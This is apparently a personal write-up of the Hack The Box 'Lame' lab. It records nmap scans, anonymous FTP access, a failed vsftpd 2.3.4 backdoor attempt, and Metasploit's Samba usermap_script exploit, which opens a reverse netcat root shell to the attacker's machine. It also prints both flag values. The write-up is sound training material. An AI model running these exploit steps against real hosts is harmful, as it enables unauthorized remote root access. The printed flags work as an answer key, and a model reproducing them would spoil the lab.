---
title: HTB - LAME - Easy
date: 2026-02-18
tags: ["Linux", "Reconnaissance"]
description: Walkthrough of the HTB - LAME lab
difficulty: Easy
---



Difficulty: Easy
OS: Linux (Debian)
Date: 2026-02-18
IP: 10.129.1.232


# Summary

Lame was an easy difficulty lab and a great introduction to the HTB Labs platform, it consisted of a Linux target that required only one exploit to acquire a root shell.

---

# Reconnaissance

## Initial Nmap Scan

```bash
nmap -sV -O -sC -T4 10.129.1.232

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|general purpose|broadband router
Running (JUST GUESSING): Linux 2.4.X|2.6.X|3.X (94%), OpenBSD 4.X (92%), Linksys embedded (88%), Arris embedded (87%), Belkin embedded (87%), Cisco embedded (87%)
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:openbsd:openbsd:4.3 cpe:/o:linux:linux_kernel:2.4.18 cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:3 cpe:/h:linksys:wrv54g cpe:/h:belkin:n300
Aggressive OS guesses: OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (94%), OpenWrt White Russian 0.9 (Linux 2.4.30) (94%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (94%), OpenBSD 4.3 (92%), Linux 2.4.18 (91%), Linux 2.4.7 (90%), Linux 2.6.18 (90%), Linux 2.6.23 (90%), Linux 2.6.32 - 3.10 (88%), Linksys WRV54G WAP (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-02-18T16:00:09-05:00
|_clock-skew: mean: 2h30m37s, deviation: 3h32m11s, median: 34s
|_smb2-time: Protocol negotiation failed (SMB2)

```

Findings:

* FTP (Port 21) - Anonymous login allowed, vsfptd 2.3.4 (exploitable)
* SSH (Port 22) - OpenSSH 4.7p1
* SMB (Ports 139, 445) - samba 3.0.20-Debian
* OS Detected: Debian
* Computer name: lame
* domain name: hackthebox.gr

## Full Nmap Scan

```bash
nmap -sV -O -sC -T4 -p- 10.129.1.232  
```

Findings: Nothing changed from top 1000

## Nmap UDP Scan

```bash
nmap -sU -sV --top-port 100 10.129.1.232

PORT    STATE  SERVICE      VERSION
139/udp closed netbios-ssn
445/udp closed microsoft-ds
```

Findings: nothing additional identified

## FTP

```bash
nmap -p21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor 10.129.1.232

PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status

```

### FTP - Anonymous Login

```bash
ftp 10.129.1.232
Connected to 10.129.1.232.
220 (vsFTPd 2.3.4)
Name (10.129.1.232:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> status
Connected and logged into 10.129.1.232.
No proxy connection.
Gate ftp: off, server (none), port ftpgate.
Passive mode: on; fallback to active mode: on.
Mode: stream; Type: binary; Form: non-print; Structure: file.
Verbose: on; Bell: off; Prompting: on; Globbing: on.
Store unique: off; Receive unique: off.
Preserve modification times: on.
Case: off; CR stripping: on.
Ntrans: off.
Nmap: off.
Hash mark printing: off; Mark count: 1024; Progress bar: on.
Get transfer rate throttle: off; maximum: 0; increment 1024.
Put transfer rate throttle: off; maximum: 0; increment 1024.
Socket buffer sizes: send 16384, receive 131072.
Use of PORT cmds: on.
Use of EPSV/EPRT cmds for IPv4: on.
Use of EPSV/EPRT cmds for IPv6: on.
Command line editing: on.
Version: tnftp 20230507
ftp> ls -la
229 Entering Extended Passive Mode (|||38708|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> 
```

Findings: successful anonymous login, but there is nothing interesting here

### FTP - vsftpd 2.3.4 exploit (FAILED)

```bash
msf exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 10.129.1.232
rhost => 10.129.1.232
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.129.1.232:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.1.232:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/vsftpd_234_backdoor) > 
```

Findings: failed, moving on to SMB

## SMB

```bash
sudo nmap -p139,445 -sV -sC -T4 10.129.1.232

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2026-02-18T16:13:17-05:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h30m36s, deviation: 3h32m09s, median: 35s

```

```bash
searchsploit samba 3.0.20
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass  | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Comma | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                   | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)           | linux_x86/dos/36741.py
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Findings: samba 3.0.20 -> vulnerable to usermap script

---

# Initial Access

## SMB - usermap script

```bash
msf exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.14.228
msf exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host
                                       :port][...]. Supported proxies: socks4, socks5, s
                                       ocks5h, http, sapni
   RHOSTS   10.129.1.232     yes       The target host(s), see https://docs.metasploit.c
                                       om/docs/using-metasploit/basics/using-metasploit.
                                       html
   RPORT    139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.228     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on 10.10.14.228:4444 
[*] Command shell session 1 opened (10.10.14.228:4444 -> 10.129.1.232:34716) at 2026-02-18 15:32:05 -0600

whoami
root
ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:50:56:b0:b0:e8 brd ff:ff:ff:ff:ff:ff
    inet 10.129.1.232/16 brd 10.129.255.255 scope global eth0
    inet6 dead:beef::250:56ff:feb0:b0e8/64 scope global dynamic 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb0:b0e8/64 scope link 
       valid_lft forever preferred_lft forever

```


---

# Post Exploitation

## User Flag

```bash
cd ..
ls
ftp
makis
service
user
cd makis
ls
user.txt
cat user.txt
a22389fb31fb9f1d9e1286c09c93d306
```

**FLAG**: `a22389fb31fb9f1d9e1286c09c93d306`

![[03_USER_FLAG.png]]
## Root Flag

```bash
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
cd root
ls
Desktop
reset_logs.sh
root.txt
vnc.log
cat root.txt
7f3845f4478637b0ae2e2ea76ca594bd
```

**FLAG**: `7f3845f4478637b0ae2e2ea76ca594bd`

![[02_ROOT_FLAG.png]]

# Lessons Learned

* in lab environments, pay attention to LHOST -> did not notice that this should have been changed to the lab VPN IP